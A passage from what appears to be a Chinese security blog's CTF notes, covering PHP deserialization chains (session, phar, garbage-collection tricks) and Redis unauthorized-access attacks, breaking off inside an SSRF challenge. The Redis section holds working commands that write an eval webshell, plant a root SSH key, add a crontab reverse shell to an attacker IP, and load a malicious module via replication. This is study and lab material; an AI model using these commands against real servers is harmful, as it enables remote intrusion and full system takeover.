class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先找链尾，看到Mystery中的foreach，想到调用php原生类，定为链尾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__get (链尾，调用原生类)</span><br><span class="line">-&gt; __invoke </span><br><span class="line">(return $this-&gt;fruit10-&gt;hey 不存在的属性可以触发get)</span><br><span class="line">-&gt; __toString </span><br><span class="line">(return $newFunc(); 对象被当成函数调用可以触发invoke)</span><br><span class="line">-&gt; __destruct</span><br><span class="line">(echo $this-&gt;fruit1; 对象被当成字符串输出可以触发tostring)</span><br></pre></td></tr></table></figure>
<p>中间有个双重md5的弱比较,要求前三位为666且第四位为字母,脚本碰撞即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//array_walk 是遍历当前方法的属性,且属性为day1,值为day2</span></span><br><span class="line"><span class="comment">//先目录遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GlobIterator</span>=<span class="string">&quot;/*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123; </span><br><span class="line">                <span class="comment">//看到foreach想到原生类</span></span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//再文件读取</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$SplFileObject</span>=<span class="string">&quot;/flag44545615441084&quot;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="垃圾回收："><a href="#垃圾回收：" class="headerlink" title="垃圾回收："></a>垃圾回收：</h2><ul>
<li><p>思路：令计数器提前归零，触发__destruct方法，以绕过报错</p>
</li>
<li><p>法一：</p>
<p>反序列化数组，数组中多次引用待销毁的类(+2)，然后多次重复调用子类(-1)，以使得计数器归0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>(),<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>());</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;a:2:&#123;i:0;O:7:&quot;ctfshow&quot;:0:&#123;&#125;i=0;i=0&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>法二：</p>
<p>传入出错的序列化字符，在反序列化的时候就销毁syc类</p>
<p>(php中即使完整的反序列化失败了，但是这个过程中涉及对象仍可以触发魔法函数，同时unserialize运行失败会对运行中已创建的类进行销毁)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;<span class="number">0</span>:<span class="number">7</span>:<span class="string">&quot;classes&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;<span class="number">0</span>:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;原序列化字符串执行修改:</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;<span class="number">0</span>:<span class="number">7</span>:<span class="string">&quot;classes&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;<span class="number">0</span>:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">     <span class="comment">//删去末尾的&#x27;&#125;&#x27;</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;<span class="number">0</span>:<span class="number">7</span>:<span class="string">&quot;classes&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;<span class="number">0</span>:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;</span><br><span class="line">     <span class="comment">//增大原有元素数目</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;<span class="number">0</span>:<span class="number">7</span>:<span class="string">&quot;classes&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;<span class="number">0</span>:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;;&#125;</span><br><span class="line">     <span class="comment">//增加一个分号</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化:"></a>session反序列化:</h2><ul>
<li>session会储存序列化后的用户临时数据,不同处理器的储存格式如下:</li>
</ul>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<ul>
<li><p>原理:</p>
<p><code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
</li>
<li><p>利用:</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;panda&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> <span class="title class_">XianZhi</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//session初始内容为a:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="comment">//传入session=a:1:&#123;s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;xianzhi&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment">//再次访问class.php,会发现也输出了xianzhi</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>条件:</p>
<p>读取session值&amp;可传入session值</p>
<p>要不断发送请求</p>
<p><img src="/../images/09436aab4385f62805d31484d24af0bb.png"></p>
</li>
</ul>
<h2 id="phar反序列化："><a href="#phar反序列化：" class="headerlink" title="phar反序列化："></a>phar反序列化：</h2><p><strong>php8弃用</strong></p>
<p>利用条件：</p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<p><img src="/../images/3ZdtwYQ8MBurxvo.png"></p>
<p>生成文件方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头(可加可不加)</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>最后传参filename&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.phar(啥后缀都行)</p>
<p>参考:</p>
<p><a href="https://xz.aliyun.com/news/6244?time__1311=YqIxBDgDnD07qGNKeeqBIKAKKr=jWWKa4D&u_atoken=3ec327286f1118fb52bf7878af975a5b&u_asig=ac11000117405034268181949e0082">https://xz.aliyun.com/news/6244?time__1311=YqIxBDgDnD07qGNKeeqBIKAKKr%3DjWWKa4D&amp;u_atoken=3ec327286f1118fb52bf7878af975a5b&amp;u_asig=ac11000117405034268181949e0082</a></p>
<p><a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>redis攻击手法</title>
    <url>/2025/06/10/redis/</url>
    <content><![CDATA[<h1 id="redis配置"><a href="#redis配置" class="headerlink" title="redis配置"></a>redis配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar xzf redis-3.2.0.tar.gz</span><br><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> redis-3.2.0</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）注释掉<span class="string">&quot;bind 127.0.0.1&quot;</span></span><br><span class="line">注释这行语句，代表任意机器都可以登录redis</span><br><span class="line">（2）protected-mode设置为no，代表关闭安全设置</span><br><span class="line">（3）daemonize设置为<span class="built_in">yes</span>，设置后台运行</span><br></pre></td></tr></table></figure>

<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./src/redis-server redis.conf</span><br><span class="line">./src/redis-cli -a 密码 -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">./src/redis-cli -h 127.0.0.1 </span><br><span class="line">config <span class="built_in">set</span> requirepass 1234 <span class="comment">#设置密码</span></span><br><span class="line">./src/redis-cli -a 密码 -h 127.0.0.1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查是否启动成功</span></span><br><span class="line">netstate -atopt | grep redis</span><br><span class="line">-a：显示所有连接（包括监听中的和已建立的连接）。</span><br><span class="line"></span><br><span class="line">-t：仅显示 TCP 协议的连接（<span class="string">&quot;t&quot;</span> <span class="keyword">for</span> TCP）。</span><br><span class="line"></span><br><span class="line">-o：显示计时器（Timers），可帮助判断连接处于什么状态（如 keepalive、on/off、<span class="keyword">time</span> <span class="built_in">wait</span> 等）。</span><br><span class="line"></span><br><span class="line">-p：显示与连接关联的进程 PID 和程序名。</span><br><span class="line"></span><br><span class="line">-n：显示数字格式的地址和端口（不进行 DNS 反查，可以更快）</span><br><span class="line"></span><br><span class="line">ps -aux | grep redis</span><br><span class="line">查看redis软件进程</span><br></pre></td></tr></table></figure>



<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p>一般是通过设置数据库备份储存文件来覆盖特殊目标文件,来触发漏洞</p>
<p>条件：</p>
<ul>
<li>redis对外开放</li>
<li>目录可写</li>
<li>密码已知或者未授权</li>
<li>出网（可选）</li>
</ul>
<h2 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># redis客户端远程连接redis数据库</span></span><br><span class="line">redis-cli -h 10.0.1.12 -p 6379</span><br><span class="line"><span class="comment"># 设置redis当前工作路径，设置在web目录下</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置文件名，后缀为可执行文件</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 写入shell，key为键名，意为新增一个键值对，当备份时将保存进备份文件</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;ch4nge&#x27;]);?&gt;\n\n\n&quot;</span></span><br><span class="line"><span class="comment"># 创建当前数据库的备份。由于我们修改了数据库备份文件为shell.php，工作路径为web目录，因此将生成一个文件保存在web目录。该文件中有可被识别到的PHP语句，将被执行。</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h2 id="利用公私钥认证获得root权限"><a href="#利用公私钥认证获得root权限" class="headerlink" title="利用公私钥认证获得root权限"></a>利用公私钥认证获得root权限</h2><p>redis服务对外开放，未授权或已知密码，并且ssh服务对外开放，可以通过密钥登认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机生成ssh密钥文件</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> /root/.ssh</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> key.txt | redis-cli -h 10.0.1.12 -a ch4nge -x <span class="built_in">set</span> xxx</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@10.0.1.12</span><br></pre></td></tr></table></figure>

<p>补:ssh认证的两种方式</p>
<ol>
<li>密码认证:直接提供用户名和密码</li>
<li>公钥认证:公钥在用户账户下的<code>~/.ssh/authorized_keys</code>文件中,用户登录用私钥进行身份验证</li>
</ol>
<h2 id="利用crontab反弹shell-centos"><a href="#利用crontab反弹shell-centos" class="headerlink" title="利用crontab反弹shell(centos)"></a>利用crontab反弹shell(centos)</h2><p>redis服务对外开放，未授权或已知密码，并且靶机出网（可访问攻击机），可以设置计划任务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.225/6666 0&gt;&amp;1\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>补:ubuntu要复制到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;,还要chmod 600+删乱码</p>
<p>(有点没用)</p>
<h1 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h1><p>redis4.x和5.x</p>
<p>攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害人〈从机)上</p>
<h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><p>工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br><span class="line"><span class="comment"># redis-rogue-server，未授权使用</span></span><br><span class="line"></span><br><span class="line">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</span><br><span class="line"><span class="comment"># Awsome-Redis-Rogue-Server，有授权使用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 redis_rogue_server.py -rhost ip1 -lhost ip2 -passwd 1234</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250526235638541.png" alt="image-20250526235638541"></p>
<h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><p>靶机只允许本地连接（bind 0.0.0.0）</p>
<p>本地连接后，设定主机，同步恶意so文件，进行加载，实现命令执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机（开启服务器）</span></span><br><span class="line">python3 redis_rogue_server.py -v -path exp.so </span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /tmp <span class="comment">#设置到有写入权限的目录</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename exp.so</span><br><span class="line">slaveof ip 15000 <span class="comment">#设置主机和端口号，进行主从同步，so文件写入</span></span><br><span class="line"></span><br><span class="line">slaveof NO ONE <span class="comment">#关闭本地服务器</span></span><br><span class="line"></span><br><span class="line">module load ./exp.so <span class="comment">#加载恶意文件</span></span><br><span class="line">module list <span class="comment">#查看是否加载成功</span></span><br><span class="line"></span><br><span class="line">system.exec <span class="string">&quot;id&quot;</span> <span class="comment">#调用模块执行命令</span></span><br><span class="line">system.rev ip 666 <span class="comment">#反弹shell</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/../images/1a92a16c-9b3a-417c-bb0e-2bc20feae909.png" alt="1a92a16c-9b3a-417c-bb0e-2bc20feae909"></p>
<p>参考：<a href="https://www.sec-in.com/article/1309">https://www.sec-in.com/article/1309</a></p>
<h1 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h1><h2 id="网鼎杯2020玄武组SSRFME"><a href="#网鼎杯2020玄武组SSRFME" class="headerlink" title="网鼎杯2020玄武组SSRFME"></a>网鼎杯2020玄武组SSRFME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>要本地访问hint.php,构造如下:</p>
